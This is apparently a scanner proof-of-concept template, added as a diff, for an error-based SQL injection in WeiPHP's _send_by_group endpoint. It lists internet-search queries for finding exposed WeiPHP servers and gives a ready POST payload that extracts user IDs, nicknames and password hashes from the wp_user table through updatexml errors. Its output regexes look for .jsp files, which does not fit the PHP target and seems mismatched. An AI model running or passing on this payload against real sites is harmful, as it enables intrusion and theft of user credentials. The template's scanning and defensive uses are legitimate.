@@ -1,0 +1,47 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="WeiPHP"
+    hunter-query: web.body="/css/weiphp.css"
+    quake-query: app:"weiphp"
+    zoomeye-query: app:"WeiPHP"
+    threatbook-query: body="/css/weiphp.css"
+    cve: 
+    cnvd:
+    tips:  mysql  |  报错注入
+    
+name: poc-yaml-WeiPHP-_send_by_group-sqli
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /public/index.php/weixin/message/_send_by_group
+      follow_redirects: false      
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+      body: "group_id[0]=exp&group_id[1]=%29+and+updatexml%281%2Cconcat%280x7e%2C%28select+substr%28group_concat%28uid%2Cnickname%2Cpassword%29%2C1%2C31%29+from+wp_user%29%2C0x7e%29%2C1%29+--"
+    expression: >-
+      response.status == 500 && response.body_string.contains("XPATH syntax")
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+expression: r0() 
